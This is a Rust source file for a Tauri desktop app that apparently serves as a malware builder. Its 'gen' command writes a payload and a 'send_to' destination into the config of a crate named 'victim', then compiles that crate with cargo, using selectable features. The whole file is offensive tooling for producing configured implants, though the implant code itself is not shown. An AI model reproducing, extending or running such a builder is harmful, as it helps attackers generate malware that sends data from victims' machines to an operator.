#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

use std::process::Command;
use config::Config;
use std::fs::File;
use std::io::Write;

#[tauri::command]
fn gen(features: Vec<String>, mut payload: Option<String>, send_to: String) {
    if payload == Some("".to_string()) {payload = None;}
    let mut path = std::env::current_exe().unwrap();
    for _ in 0..4 {
        path.pop();
    }
    path.push("victim");
    path.push("config.toml");
    let config = Config {
        payload: payload.clone(),
        send_to,
    };
    let mut file = File::create(path.clone()).unwrap();
    file.write_all(toml::to_string(&config).unwrap().as_bytes()).unwrap();
    file.sync_all().unwrap();
    path.pop();
    let mut args = vec!["build", "--release"];
    for i in features.iter().map(|x| x.as_str()).collect::<Vec<_>>() {
        args.push("--features");
        args.push(i);
    }
    if payload.is_some() {
        args.push("--features");
        args.push("payload");
    }
    Command::new("cargo")
            .args(args)
            .current_dir(&path.display().to_string())
            .output()
            .expect("failed to execute process");
}

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![gen])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
